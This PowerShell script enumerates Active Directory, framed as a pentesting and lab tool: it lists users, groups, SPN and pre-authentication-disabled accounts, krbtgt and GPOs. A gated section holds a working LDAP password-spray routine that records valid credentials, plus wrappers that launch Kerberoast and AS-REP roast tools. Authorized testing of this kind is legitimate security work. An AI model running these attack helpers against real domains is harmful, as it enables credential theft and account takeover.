<#
.SYNOPSIS
  AD enumeration + controlled attack-simulation helpers for lab / authorized pentesting.

.DESCRIPTION
  - Enumerates domain, DCs, users, groups, computers, SPNs, KRBTGT info, GPOs, policies (read-only).
  - Identifies potentially Kerberoastable accounts (ServicePrincipalName populated).
  - Identifies AS-REP roastable accounts (Does not require preauth flag).
  - Optional controlled attack helpers:
      * Kerberoast (ticket request) via external tools (Rubeus / Impacket) if present OR placeholder.
      * AS-REP request helper (external tool recommended).
      * Password spraying via LDAP Bind with rate limiting and lockout awareness.
      * Optional Defender tamper checks (placeholder) — requires --ConfirmUnsafe.
  - ALL "unsafe" functions require both -ExecuteUnsafe and -ConfirmUnsafe switches.

.PARAMETER ExecuteUnsafe
  Enables the attack-simulation helpers (must be used with -ConfirmUnsafe).

.PARAMETER ConfirmUnsafe
  Explicit confirmation to allow unsafe actions. Must be used with -ExecuteUnsafe.

.PARAMETER SprayUserFile
  File with usernames (one per line) for password spraying.

.PARAMETER SprayPassFile
  File with passwords (one per line) for password spraying.

.PARAMETER SprayRate
  Maximum credential attempts per minute (default 30). Lower for safety.

.PARAMETER KerberoastToolPath
  Path to external Kerberoast-capable tool (e.g., Rubeus.exe or GetUserSPNs.py wrapper). Optional.

.PARAMETER ASREPRoastToolPath
  Path to external AS-REP roast tool (optional).

.EXAMPLE
  # Safe enumeration only:
  .\AD-Enum-And-Test.ps1 -OutFolder .\ad-output

  # Enumerate + run attack helpers (DANGEROUS) with external tools:
  .\AD-Enum-And-Test.ps1 -OutFolder .\ad-output -ExecuteUnsafe -ConfirmUnsafe -KerberoastToolPath "C:\tools\Rubeus.exe"

.NOTES
  Use only in a lab or authorized environment. Author assumes you have permission.
#>

param(
    [string]$OutFolder = ".\AD-Enumeration-$(Get-Date -Format yyyyMMdd-HHmmss)",
    [switch]$ExecuteUnsafe,
    [switch]$ConfirmUnsafe,
    [string]$SprayUserFile,
    [string]$SprayPassFile,
    [int]$SprayRate = 30,                # attempts per minute
    [int]$SprayDelaySeconds = 2,         # delay between attempts if needed (ignored if using SprayRate)
    [string]$KerberoastToolPath,
    [string]$ASREPRoastToolPath
)

function Require-Admin {
    if (-not ([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))) {
        Write-Warning "You are not running PowerShell as Administrator. Some queries (Group Policy, RSAT) may fail. Run as admin if possible."
    }
}

function Ensure-OutFolder {
    param($path)
    if (-not (Test-Path -Path $path)) {
        New-Item -Path $path -ItemType Directory | Out-Null
    }
}

function Module-Available {
    param([string]$Name)
    return (Get-Module -ListAvailable -Name $Name) -ne $null
}

function Save-Json {
    param($Obj, $Path)
    $Obj | ConvertTo-Json -Depth 5 | Out-File -FilePath $Path -Encoding UTF8
}

# ---------------------------
# Basic checks
# ---------------------------
Require-Admin
Ensure-OutFolder -path $OutFolder
Write-Host "Output folder: $OutFolder" -ForegroundColor Cyan

$Results = [ordered]@{}
$now = Get-Date

# ---------------------------
# DOMAIN / DC / NETBIOS / DNS
# ---------------------------
try {
    Write-Host "`n[*] Domain & DC discovery..." -ForegroundColor Green
    $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
    $forest = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).Name
    $dcs = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | ForEach-Object {
        @{ Name = $_.Name; IPs = [System.Net.Dns]::GetHostAddresses($_.Name) | ForEach-Object { $_.IPAddressToString } }
    }
    $Results.Domain = @{
        Name = $domain
        Forest = $forest
        DomainControllers = $dcs
    }
    Save-Json -Obj $Results.Domain -Path (Join-Path $OutFolder "domain.json")
    Write-Host "Domain: $domain, Forest: $forest"
} catch {
    Write-Warning "Failed to auto-detect domain via .NET API. Attempt fallback to environment/domain env vars."
    $envDomain = $env:USERDOMAIN
    $Results.Domain = @{ Name = $envDomain; DomainControllers = @() }
    Save-Json -Obj $Results.Domain -Path (Join-Path $OutFolder "domain.json")
}

# ---------------------------
# Active Directory module helper wrappers
# ---------------------------
$haveAD = $false
if (Module-Available -Name "ActiveDirectory") {
    Import-Module ActiveDirectory -ErrorAction SilentlyContinue
    $haveAD = $true
    Write-Host "ActiveDirectory module loaded." -ForegroundColor Green
} else {
    Write-Warning "ActiveDirectory module not found. Some AD enumeration will attempt LDAP fallbacks where possible."
}

# ---------------------------
# ENUM: Users, Groups, Computers
# ---------------------------
Write-Host "`n[*] Enumerating users, groups, computers..." -ForegroundColor Green
try {
    if ($haveAD) {
        $users = Get-ADUser -Filter * -Properties DisplayName,SamAccountName,UserPrincipalName,Enabled,GivenName,Surname,DistinguishedName,ServicePrincipalName,userAccountControl,PasswordLastSet | Select-Object -Property DisplayName,SamAccountName,UserPrincipalName,Enabled,DistinguishedName,ServicePrincipalName,userAccountControl,PasswordLastSet
        $groups = Get-ADGroup -Filter * -Properties Name,SamAccountName,DistinguishedName,GroupCategory,GroupScope | Select-Object Name,SamAccountName,DistinguishedName,GroupCategory,GroupScope
        $computers = Get-ADComputer -Filter * -Properties Name,OperatingSystem,OperatingSystemVersion,DistinguishedName,lastLogonDate | Select-Object Name,OperatingSystem,OperatingSystemVersion,DistinguishedName,lastLogonDate
    } else {
        # Fallback LDAP queries (lightweight)
        Write-Warning "Using fallback LDAP queries via System.DirectoryServices.DirectorySearcher. Results may be limited."
        $root = "LDAP://$env:USERDNSDOMAIN"
        $ds = New-Object System.DirectoryServices.DirectoryEntry($root)
        $search = New-Object System.DirectoryServices.DirectorySearcher($ds)
        $search.PageSize = 1000
        # users
        $search.Filter = "(&(objectCategory=person)(objectClass=user))"
        $search.PropertiesToLoad.AddRange(@("displayName","sAMAccountName","userPrincipalName","distinguishedName","servicePrincipalName","userAccountControl")) | Out-Null
        $userRes = $search.FindAll()
        $users = foreach ($u in $userRes) {
            $p = $u.Properties
            [PSCustomObject]@{
                DisplayName = ($p.displayname -join ";")
                SamAccountName = ($p.samaccountname -join ";")
                UserPrincipalName = ($p.userprincipalname -join ";")
                DistinguishedName = ($p.distinguishedname -join ";")
                ServicePrincipalName = ($p.serviceprincipalname -join ";")
                userAccountControl = ($p.useraccountcontrol -join ";")
            }
        }
        # groups
        $search.Filter = "(objectCategory=group)"
        $search.PropertiesToLoad.Clear()
        $search.PropertiesToLoad.AddRange(@("name","sAMAccountName","distinguishedName","groupType")) | Out-Null
        $groupRes = $search.FindAll()
        $groups = foreach ($g in $groupRes) {
            $p = $g.Properties
            [PSCustomObject]@{
                Name = ($p.name -join ";")
                SamAccountName = ($p.samaccountname -join ";")
                DistinguishedName = ($p.distinguishedname -join ";")
            }
        }
        # computers
        $search.Filter = "(objectCategory=computer)"
        $search.PropertiesToLoad.Clear()
        $search.PropertiesToLoad.AddRange(@("name","operatingSystem","dNSHostName","distinguishedName")) | Out-Null
        $compRes = $search.FindAll()
        $computers = foreach ($c in $compRes) {
            $p = $c.Properties
            [PSCustomObject]@{
                Name = ($p.name -join ";")
                OperatingSystem = ($p.operatingsystem -join ";")
                DNSHostName = ($p.dnshostname -join ";")
                DistinguishedName = ($p.distinguishedname -join ";")
            }
        }
    }

    $Results.Users = $users
    $Results.Groups = $groups
    $Results.Computers = $computers

    $users | Export-Csv -Path (Join-Path $OutFolder "users.csv") -NoTypeInformation -Encoding UTF8
    $groups | Export-Csv -Path (Join-Path $OutFolder "groups.csv") -NoTypeInformation -Encoding UTF8
    $computers | Export-Csv -Path (Join-Path $OutFolder "computers.csv") -NoTypeInformation -Encoding UTF8

    Write-Host "Saved users, groups, computers to CSV in $OutFolder"
} catch {
    Write-Warning "Error enumerating users/groups/computers: $_"
}

# ---------------------------
# ENUM: SPNs (Kerberoastable accounts)
# ---------------------------
Write-Host "`n[*] Identifying accounts with ServicePrincipalName(s) (SPNs)..." -ForegroundColor Green
try {
    if ($haveAD) {
        $spnAccounts = Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName,SamAccountName,DistinguishedName | Select-Object SamAccountName,ServicePrincipalName,DistinguishedName
    } else {
        # fallback from earlier user list
        $spnAccounts = $Users | Where-Object { $_.ServicePrincipalName -and $_.ServicePrincipalName -ne "" }
    }
    $Results.SPNAccounts = $spnAccounts
    $spnAccounts | Export-Csv -Path (Join-Path $OutFolder "spn_accounts.csv") -NoTypeInformation -Encoding UTF8
    Write-Host ("{0} accounts with SPNs found." -f ($spnAccounts | Measure-Object | Select -ExpandProperty Count))
} catch {
    Write-Warning "Failed to enumerate SPNs: $_"
}

# ---------------------------
# ENUM: AS-REP roastable accounts (Accounts configured 'Do not require pre-auth')
# ---------------------------
# AD userAccountControl bit for DONT_REQ_PREAUTH: 0x00400000 (decimal 4194304)
# If userAccountControl bitwise AND 0x00400000 != 0, account does NOT require Kerberos pre-auth => AS-REP roastable.
Write-Host "`n[*] Identifying AS-REP roastable accounts (Do not require Kerberos preauthentication)..." -ForegroundColor Green
try {
    $DONT_REQ_PREAUTH = 0x00400000
    if ($haveAD) {
        $allUsers = Get-ADUser -Filter * -Properties SamAccountName,userAccountControl,DistinguishedName | Select-Object SamAccountName,userAccountControl,DistinguishedName
        $asrep = $allUsers | Where-Object { ($_.userAccountControl -band $DONT_REQ_PREAUTH) -ne 0 } | Select-Object SamAccountName,DistinguishedName,userAccountControl
    } else {
        $asrep = $users | Where-Object {
            $uac = 0
            if ([int]::TryParse($_.userAccountControl, [ref]$uac)) {
                return (($uac -band $DONT_REQ_PREAUTH) -ne 0)
            } else {
                $false
            }
        }
    }
    $Results.ASREPAccounts = $asrep
    $asrep | Export-Csv -Path (Join-Path $OutFolder "asrep_accounts.csv") -NoTypeInformation -Encoding UTF8
    Write-Host ("{0} AS-REP roastable accounts identified." -f ($asrep | Measure-Object | Select -ExpandProperty Count))
} catch {
    Write-Warning "Failed to enumerate AS-REP roastable accounts: $_"
}

# ---------------------------
# ENUM: KRBTGT account and status
# ---------------------------
Write-Host "`n[*] KRBTGT account status..." -ForegroundColor Green
try {
    if ($haveAD) {
        $krbtgt = Get-ADUser -Identity "krbtgt" -Properties SamAccountName,Enabled,PasswordLastSet,DistinguishedName | Select-Object SamAccountName,Enabled,PasswordLastSet,DistinguishedName
    } else {
        # fallback
        $search = New-Object System.DirectoryServices.DirectorySearcher
        $search.Filter = "(sAMAccountName=krbtgt)"
        $res = $search.FindOne()
        if ($res) {
            $p = $res.Properties
            $krbtgt = [PSCustomObject]@{
                SamAccountName = ($p.samaccountname -join ";")
                DistinguishedName = ($p.distinguishedname -join ";")
                Enabled = $true
                PasswordLastSet = ($p.pwdlastset -join ";")
            }
        } else { $krbtgt = $null }
    }
    $Results.KRBTGT = $krbtgt
    if ($krbtgt) {
        $krbtgt | ConvertTo-Json | Out-File (Join-Path $OutFolder "krbtgt.json")
        Write-Host "KRBTGT info saved."
    } else {
        Write-Warning "KRBTGT not found via current method."
    }
} catch {
    Write-Warning "Failed to get KRBTGT: $_"
}

# ---------------------------
# ENUM: GPOs & Security Policies (GroupPolicy module)
# ---------------------------
Write-Host "`n[*] Enumerating GPOs and domain security policy (if available)..." -ForegroundColor Green
try {
    if (Module-Available -Name "GroupPolicy") {
        Import-Module GroupPolicy -ErrorAction SilentlyContinue
        $gpos = Get-GPO -All | Select-Object DisplayName,Id,Domain,Owner,CreationTime,ModificationTime
        $Results.GPOs = $gpos
        $gpos | Export-Csv -Path (Join-Path $OutFolder "gpos.csv") -NoTypeInformation -Encoding UTF8

        # Domain policy - secedit export for domain controllers not always possible; attempt to retrieve Default Domain Policy settings where possible (requires AD rights)
        try {
            $domainPolicy = Get-GPO -Name "Default Domain Policy" -ErrorAction SilentlyContinue
            if ($domainPolicy) {
                $Results.DefaultDomainPolicy = $domainPolicy | Select-Object DisplayName,Id,Owner,CreationTime,ModificationTime
            }
        } catch { }
        Write-Host ("{0} GPOs saved." -f ($gpos | Measure-Object | Select -ExpandProperty Count))
    } else {
        Write-Warning "GroupPolicy module not present; skipping Get-GPO. You can install RSAT: GroupPolicy tools for richer output."
    }
} catch {
    Write-Warning "Failed to enumerate GPOs: $_"
}

# ---------------------------
# Save a master JSON result
# ---------------------------
try {
    Save-Json -Obj $Results -Path (Join-Path $OutFolder "ad-enumeration.json")
    Write-Host "`n[*] AD enumeration complete. Results saved to $OutFolder" -ForegroundColor Cyan
} catch {
    Write-Warning "Failed to write master JSON: $_"
}

# ---------------------------
# ATTACK-SIMULATION HELPERS (NEED explicit consent + ExecuteUnsafe)
# ---------------------------

if ($ExecuteUnsafe -and $ConfirmUnsafe) {
    Write-Host "`n[!] Unsafe mode enabled: attack-simulation helpers CAN run. You confirmed with -ConfirmUnsafe." -ForegroundColor Yellow

    # Kerberoast simulation: We will NOT attempt to crack tickets here.
    function Enumerate-Kerberoast {
        param($OutFolder)
        Write-Host "`n[>] Enumerating Kerberoast candidate accounts (SPNs)..." -ForegroundColor Magenta
        $spns = $Results.SPNAccounts
        if ($null -eq $spns) {
            Write-Warning "No SPN accounts collected earlier."
            return
        }
        $spns | Export-Csv -Path (Join-Path $OutFolder "kerberoast_candidates.csv") -NoTypeInformation -Encoding UTF8
        Write-Host "Kerberoast candidate list saved to kerberoast_candidates.csv"
        return $spns
    }

    function Invoke-ExternalKerberoast {
        param($ToolPath, $CandidatesFile)
        if (-not (Test-Path $ToolPath)) {
            Write-Warning "Kerberoast tool not found at $ToolPath. Please provide path to Rubeus.exe or Impacket GetUserSPNs.py wrapper."
            return
        }
        # Example: Rubeus.exe kerberoast /export ...
        Write-Host "Detected Kerberoast tool at $ToolPath. This script will call it with conservative defaults." -ForegroundColor Yellow
        $prompt = Read-Host "Proceed to call external tool $ToolPath with candidate list? (yes/no)"
        if ($prompt -ne "yes") { Write-Host "Aborting external tool call."; return }

        # This intentionally performs only a minimal wrapper call. Customize as needed in lab.
        try {
            & $ToolPath 2>&1 | Tee-Object -FilePath (Join-Path $OutFolder "kerberoast_tool_output.txt")
            Write-Host "Tool executed; output saved." -ForegroundColor Green
        } catch {
            Write-Warning "External tool call failed: $_"
        }
    }

    function Enumerate-ASREP {
        param($OutFolder)
        Write-Host "`n[>] AS-REP candidate accounts (no preauth)..." -ForegroundColor Magenta
        $as = $Results.ASREPAccounts
        if ($null -eq $as) {
            Write-Warning "No AS-REP accounts collected earlier."
            return
        }
        $as | Export-Csv -Path (Join-Path $OutFolder "asrep_candidates.csv") -NoTypeInformation -Encoding UTF8
        Write-Host "AS-REP candidate list saved to asrep_candidates.csv"
        return $as
    }

    function Do-PasswordSpray {
        <#
        Performs LDAP simple binds to test credential pairs. Highly intrusive if used injudiciously. 
        Requires domain permission to test. This routine respects a rate limit.
        #>
        param(
            [string]$UserFile,
            [string]$PassFile,
            [int]$AttemptsPerMinute = 30,
            [string]$OutFolder
        )

        if (-not (Test-Path $UserFile) -or -not (Test-Path $PassFile)) {
            Write-Warning "User or password file not found. Provide valid paths."
            return
        }

        $users = Get-Content -Path $UserFile | Where-Object { $_ -and $_.Trim() -ne "" }
        $passwords = Get-Content -Path $PassFile | Where-Object { $_ -and $_.Trim() -ne "" }

        Write-Host "`n[!] PASSWORD SPRAY WILL ATTEMPT BINDs. Confirm you have authorization to test." -ForegroundColor Red
        $ok = Read-Host "Type 'I HAVE AUTH' to proceed"
        if ($ok -ne "I HAVE AUTH") {
            Write-Host "Authorization confirmation missing. Aborting spray."
            return
        }

        $results = @()
        # Calculate delay between attempts to not exceed AttemptsPerMinute
        $delayMs = [math]::Max(500, [int]((60 / $AttemptsPerMinute) * 1000))
        foreach ($pwd in $passwords) {
            foreach ($user in $users) {
                # Basic LDAP bind attempt using System.DirectoryServices.Protocols
                try {
                    $ldapServer = $Results.Domain.DomainControllers[0].Name
                    if (-not $ldapServer) { $ldapServer = $env:USERDNSDOMAIN }
                    $creds = New-Object System.Net.NetworkCredential($user, $pwd)
                    $ldapConn = New-Object System.DirectoryServices.Protocols.LdapConnection($ldapServer)
                    $ldapConn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Basic
                    $ldapConn.Credential = $creds
                    $ldapConn.Timeout = New-TimeSpan -Seconds 5

                    # Attempt simple bind
                    $ldapConn.Bind()
                    $res = [PSCustomObject]@{ User = $user; Password = $pwd; Result = "Success"; Time = (Get-Date) }
                    Write-Host ("[SUCCESS] {0} : {1}" -f $user, $pwd) -ForegroundColor Red
                    $results += $res
                } catch [System.DirectoryServices.Protocols.LdapException] {
                    $code = $_.Exception.ErrorCode
                    # handle invalid creds vs other errors
                    $results += [PSCustomObject]@{ User = $user; Password = $pwd; Result = "Failed"; Error = $_.Exception.Message; Time = (Get-Date) }
                    Write-Host ("[FAIL] {0} : {1} -- {2}" -f $user, $pwd, $_.Exception.Message) -ForegroundColor DarkGray
                } catch {
                    $results += [PSCustomObject]@{ User = $user; Password = $pwd; Result = "Error"; Error = $_.Exception.Message; Time = (Get-Date) }
                } finally {
                    # polite delay
                    Start-Sleep -Milliseconds $delayMs
                }
            }
        }
        $results | Export-Csv -Path (Join-Path $OutFolder "password_spray_results.csv") -NoTypeInformation -Encoding UTF8
        Write-Host "Password spray attempts complete. Results saved."
    }

    # Run enumerations for potential attacks
    $kerbCandidates = Enumerate-Kerberoast -OutFolder $OutFolder
    $asrepCandidates = Enumerate-ASREP -OutFolder $OutFolder

    # If external tool paths provided, offer to call them
    if ($KerberoastToolPath) {
        $choose = Read-Host "Call external Kerberoast tool at $KerberoastToolPath now? (yes/no)"
        if ($choose -eq "yes") {
            $candFile = Join-Path $OutFolder "kerberoast_candidates.csv"
            Invoke-ExternalKerberoast -ToolPath $KerberoastToolPath -CandidatesFile $candFile
        } else { Write-Host "Skipped external Kerberoast call." }
    }

    if ($ASREPRoastToolPath) {
        $choose = Read-Host "Call external AS-REP roast tool at $ASREPRoastToolPath now? (yes/no)"
        if ($choose -eq "yes") {
            Write-Host "Attempting external AS-REP tool. Monitor output file."
            try {
                & $ASREPRoastToolPath 2>&1 | Tee-Object -FilePath (Join-Path $OutFolder "asreproast_tool_output.txt")
            } catch {
                Write-Warning "External AS-REP tool call failed: $_"
            }
        } else { Write-Host "Skipped external AS-REP call." }
    }

    # Password spray if files provided
    if ($SprayUserFile -and $SprayPassFile) {
        Do-PasswordSpray -UserFile $SprayUserFile -PassFile $SprayPassFile -AttemptsPerMinute $SprayRate -OutFolder $OutFolder
    } else {
        Write-Host "No spray files provided. To run password spray, supply -SprayUserFile and -SprayPassFile."
    }

    # Placeholder for Defender tamper tests
    Write-Host "`n[!] Defender tamper checks are environment-specific and potentially destructive. This script contains placeholders only." -ForegroundColor Yellow
    $tamperPrompt = Read-Host "Do you want to run tamper placeholder actions (only prints suggested checks)? (yes/no)"
    if ($tamperPrompt -eq "yes") {
        Write-Host @"
Suggested safe tamper checks (non-destructive):
 - Query Windows Event Log for Defender block/AV events.
 - Query Defender AV signature and real-time protection settings (Get-MpComputerStatus).
 - Do NOT disable Defender or modify policies from this script.
"@
    }

} else {
    if ($ExecuteUnsafe -and -not $ConfirmUnsafe) {
        Write-Warning "You passed -ExecuteUnsafe but not -ConfirmUnsafe. Both are required to enable attack helpers. Exiting unsafe block."
    } else {
        Write-Host "`n[*] Unsafe helpers are disabled. To enable, pass -ExecuteUnsafe and -ConfirmUnsafe (use with caution, only in lab/authorized env)." -ForegroundColor Cyan
    }
}

Write-Host "`nAll done. Review output in: $OutFolder" -ForegroundColor Green

# End of script
